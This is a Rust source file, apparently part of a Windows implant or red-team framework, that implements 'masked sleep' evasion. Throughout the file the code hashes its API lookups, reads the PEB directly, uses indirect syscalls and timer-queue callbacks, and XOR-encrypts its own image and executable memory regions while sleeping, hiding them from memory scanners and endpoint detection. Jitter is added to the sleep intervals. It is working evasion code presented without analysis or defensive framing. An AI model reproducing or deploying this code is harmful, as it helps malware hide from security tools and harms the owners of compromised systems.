#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    MEMORY_BASIC_INFORMATION, PAGE_NOACCESS, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, MEM_COMMIT,
};
// WT_EXECUTEINTIMERTHREAD value (0x20) — avoids kernel32 IAT import of Threading module
#[cfg(target_os = "windows")]
const WT_EXEC_TIMER: u32 = 0x00000020;
// Non-x64 fallback only: use kernel32 timer queue APIs
#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
use windows_sys::Win32::System::Threading::{
    CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
};

#[cfg(target_os = "windows")]
static mut SLEEP_KEY: [u8; 16] = [0u8; 16];

/// Read PEB.ImageBaseAddress (+0x10) to get own PE base without GetModuleHandleA.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn get_own_image_base() -> *mut u8 {
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, readonly, preserves_flags),
    );
    if peb.is_null() { return core::ptr::null_mut(); }
    *(peb.add(0x10) as *const *mut u8)
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn get_own_image_base() -> *mut u8 {
    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(core::ptr::null()) as *mut u8
}

#[cfg(target_os = "windows")]
struct SleepCtx {
    base:       *mut u8,
    size:       usize,
    encrypt:    bool,
    prot_ssn:   u16,
    prot_tramp: *const u8,
    qvm_ssn:    u16,
    qvm_tramp:  *const u8,
}

/// Resolve RtlCreateTimerQueue/RtlCreateTimer/RtlDeleteTimerQueueEx from ntdll by hash.
/// Returns (create_queue, create_timer, delete_queue_ex) function pointers or None.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn resolve_rtl_timer_fns() -> Option<(usize, usize, usize)> {
    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
    use crate::resolve::api_hash::h;
    let ntdll = peb_get_module_base(djb2_hash_lower(b"ntdll.dll"));
    if ntdll.is_null() { return None; }
    let ctq = resolve_by_hash(ntdll, h::RTL_CRE_TQ)? as usize;
    let ct  = resolve_by_hash(ntdll, h::RTL_CRE_T)? as usize;
    let dtq = resolve_by_hash(ntdll, h::RTL_DEL_TQ)? as usize;
    Some((ctq, ct, dtq))
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn masked_sleep(duration_ms: u32) {
    use rand::RngCore;
    use crate::evasion::syscalls::get_ssn_h;
    use crate::resolve::api_hash::h;
    rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);
    let image_base = get_own_image_base();
    let image_size = if image_base.is_null() { 0 } else { get_image_size(image_base) };
    let (prot_ssn, prot_tramp) = get_ssn_h(h::NT_PROT_VM).unwrap_or((0, core::ptr::null()));
    let (qvm_ssn,  qvm_tramp)  = get_ssn_h(h::NT_QUERY_VM).unwrap_or((0, core::ptr::null()));

    // RtlCreateTimerQueue(*mut isize) -> i32
    // RtlCreateTimer(queue, *mut isize, cb, param, due, period, flags) -> i32
    // RtlDeleteTimerQueueEx(queue, event) -> i32
    type RtlCTQ    = unsafe extern "system" fn(*mut isize) -> i32;
    type RtlCT     = unsafe extern "system" fn(isize, *mut isize, *const core::ffi::c_void, *mut core::ffi::c_void, u32, u32, u32) -> i32;
    type RtlDelTQEx = unsafe extern "system" fn(isize, isize) -> i32;

    let (p_ctq, p_ct, p_dtq) = match resolve_rtl_timer_fns() {
        Some(v) => v,
        None    => { masked_sleep_kernel32(duration_ms, image_base, image_size, prot_ssn, prot_tramp, qvm_ssn, qvm_tramp); return; }
    };
    let rtl_ctq: RtlCTQ      = core::mem::transmute(p_ctq);
    let rtl_ct:  RtlCT       = core::mem::transmute(p_ct);
    let rtl_dtq: RtlDelTQEx  = core::mem::transmute(p_dtq);

    let mut timer_queue: isize = 0;
    rtl_ctq(&mut timer_queue);
    if timer_queue == 0 { return; }

    let ctx1 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: true,
        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
    }));
    let mut t1: isize = 0;
    rtl_ct(timer_queue, &mut t1, sleep_callback as *const core::ffi::c_void, ctx1 as *mut core::ffi::c_void, 0, 0, WT_EXEC_TIMER);

    let ctx2 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: false,
        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
    }));
    let mut t2: isize = 0;
    rtl_ct(timer_queue, &mut t2, sleep_callback as *const core::ffi::c_void, ctx2 as *mut core::ffi::c_void, duration_ms, 0, WT_EXEC_TIMER);

    let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
    if let Some((ssn_delay, tramp_delay)) = get_ssn_h(h::NT_DELAY) {
        crate::evasion::syscalls::indirect_syscall(ssn_delay, tramp_delay, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
    }
    rtl_dtq(timer_queue, -1isize); // -1 = INVALID_HANDLE_VALUE
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
pub unsafe fn masked_sleep(duration_ms: u32) {
    use rand::RngCore;
    use crate::evasion::syscalls::get_ssn_h;
    use crate::resolve::api_hash::h;
    rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);
    let image_base = get_own_image_base();
    let image_size = if image_base.is_null() { 0 } else { get_image_size(image_base) };
    let (prot_ssn, prot_tramp) = get_ssn_h(h::NT_PROT_VM).unwrap_or((0, core::ptr::null()));
    let (qvm_ssn,  qvm_tramp)  = get_ssn_h(h::NT_QUERY_VM).unwrap_or((0, core::ptr::null()));
    masked_sleep_kernel32(duration_ms, image_base, image_size, prot_ssn, prot_tramp, qvm_ssn, qvm_tramp);
}

#[cfg(target_os = "windows")]
unsafe fn masked_sleep_kernel32(
    duration_ms: u32, image_base: *mut u8, image_size: usize,
    prot_ssn: u16, prot_tramp: *const u8, qvm_ssn: u16, qvm_tramp: *const u8,
) {
    use crate::evasion::syscalls::get_ssn_h;
    use crate::resolve::api_hash::h;
    let timer_queue = CreateTimerQueue();
    let ctx1 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: true,
        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
    }));
    let mut t1: isize = 0;
    CreateTimerQueueTimer(&mut t1, timer_queue, Some(sleep_callback), ctx1 as _, 0, 0, WT_EXEC_TIMER);
    let ctx2 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: false,
        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
    }));
    let mut t2: isize = 0;
    CreateTimerQueueTimer(&mut t2, timer_queue, Some(sleep_callback), ctx2 as _, duration_ms, 0, WT_EXEC_TIMER);
    let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
    if let Some((ssn_delay, tramp_delay)) = get_ssn_h(h::NT_DELAY) {
        crate::evasion::syscalls::indirect_syscall(ssn_delay, tramp_delay, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
    }
    DeleteTimerQueueEx(timer_queue, -1isize);
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn sleep_callback(ctx_ptr: *mut core::ffi::c_void, _: u8) {
    use crate::evasion::syscalls::indirect_syscall;
    let ctx = &*(ctx_ptr as *const SleepCtx);
    if ctx.base.is_null() || ctx.size == 0 || ctx.prot_ssn == 0 { return; }

    let ph = usize::MAX; // -1 = current process

    if ctx.encrypt {
        // XOR image FIRST (while still accessible), then hide it.
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
        let mut base = ctx.base as usize; let mut sz = ctx.size; let mut old = 0u32;
        indirect_syscall(ctx.prot_ssn, ctx.prot_tramp, ph,
            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
            PAGE_NOACCESS as usize, &mut old as *mut u32 as usize, 0);
        encrypt_rx_regions(ctx.base, ctx.prot_ssn, ctx.prot_tramp, ctx.qvm_ssn, ctx.qvm_tramp);
    } else {
        // Restore other regions first, then re-enable and XOR the image.
        decrypt_rx_regions(ctx.base, ctx.prot_ssn, ctx.prot_tramp, ctx.qvm_ssn, ctx.qvm_tramp);
        // Make image writable before XOR, then restore execution permission.
        let mut base = ctx.base as usize; let mut sz = ctx.size; let mut old = 0u32;
        indirect_syscall(ctx.prot_ssn, ctx.prot_tramp, ph,
            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
            PAGE_EXECUTE_READWRITE as usize, &mut old as *mut u32 as usize, 0);
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
        let mut base2 = ctx.base as usize; let mut sz2 = ctx.size;
        indirect_syscall(ctx.prot_ssn, ctx.prot_tramp, ph,
            &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
            PAGE_EXECUTE_READ as usize, &mut old as *mut u32 as usize, 0);
    }
}

#[cfg(target_os = "windows")]
unsafe fn xor_region(base: *mut u8, size: usize, key: &[u8; 16]) {
    for i in 0..size {
        *base.add(i) ^= key[i % 16];
    }
}

#[cfg(target_os = "windows")]
unsafe fn encrypt_rx_regions(
    image_base: *mut u8,
    prot_ssn: u16, prot_tramp: *const u8,
    qvm_ssn: u16, qvm_tramp: *const u8,
) {
    use crate::evasion::syscalls::indirect_syscall;
    if qvm_ssn == 0 || prot_ssn == 0 { return; }

    let ph = usize::MAX;
    let mut addr: usize = 0;
    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = core::mem::zeroed();
        let mut ret_len: usize = 0;
        let status = indirect_syscall(
            qvm_ssn, qvm_tramp,
            ph, addr, 0,
            &mut mbi as *mut MEMORY_BASIC_INFORMATION as usize,
            core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            &mut ret_len as *mut usize as usize,
        );
        if status != 0 { break; }
        let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
        let is_image   = mbi.BaseAddress as usize == image_base as usize;
        if mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READ && !is_image && mbi.RegionSize > 0 {
            // XOR before hiding (order matters).
            xor_region(mbi.BaseAddress as *mut u8, mbi.RegionSize, &SLEEP_KEY);
            let mut base = mbi.BaseAddress as usize; let mut sz = mbi.RegionSize; let mut old = 0u32;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
                PAGE_NOACCESS as usize, &mut old as *mut u32 as usize, 0);
        }
        addr = region_end;
        if addr == 0 { break; }
    }
}

#[cfg(target_os = "windows")]
unsafe fn decrypt_rx_regions(
    image_base: *mut u8,
    prot_ssn: u16, prot_tramp: *const u8,
    qvm_ssn: u16, qvm_tramp: *const u8,
) {
    use crate::evasion::syscalls::indirect_syscall;
    if qvm_ssn == 0 || prot_ssn == 0 { return; }

    let ph = usize::MAX;
    let mut addr: usize = 0;
    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = core::mem::zeroed();
        let mut ret_len: usize = 0;
        let status = indirect_syscall(
            qvm_ssn, qvm_tramp,
            ph, addr, 0,
            &mut mbi as *mut MEMORY_BASIC_INFORMATION as usize,
            core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            &mut ret_len as *mut usize as usize,
        );
        if status != 0 { break; }
        let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
        let is_image   = mbi.BaseAddress as usize == image_base as usize;
        // PAGE_NOACCESS = 0x01 marks regions we encrypted during the encrypt phase.
        if mbi.State == MEM_COMMIT && mbi.Protect == PAGE_NOACCESS && !is_image && mbi.RegionSize > 0 {
            // Restore writable first so XOR can proceed.
            let mut base = mbi.BaseAddress as usize; let mut sz = mbi.RegionSize; let mut old = 0u32;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
                PAGE_EXECUTE_READWRITE as usize, &mut old as *mut u32 as usize, 0);
            xor_region(mbi.BaseAddress as *mut u8, mbi.RegionSize, &SLEEP_KEY);
            let mut base2 = mbi.BaseAddress as usize; let mut sz2 = mbi.RegionSize;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
                PAGE_EXECUTE_READ as usize, &mut old as *mut u32 as usize, 0);
        }
        addr = region_end;
        if addr == 0 { break; }
    }
}

#[cfg(target_os = "windows")]
unsafe fn get_image_size(base: *mut u8) -> usize {
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    *(base.add(e_lfanew + 0x18 + 0x38) as *const u32) as usize
}

/// Sleep for `base_ms` milliseconds with ±20% random jitter.
#[cfg(target_os = "windows")]
pub unsafe fn masked_sleep_jitter(base_ms: u32) {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let pct = rng.gen_range(80u32..=120u32);
    let actual_ms = ((base_ms as u64).saturating_mul(pct as u64) / 100) as u32;
    masked_sleep(actual_ms);
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn masked_sleep_jitter(base_ms: u32) {
    let _ = base_ms;
}
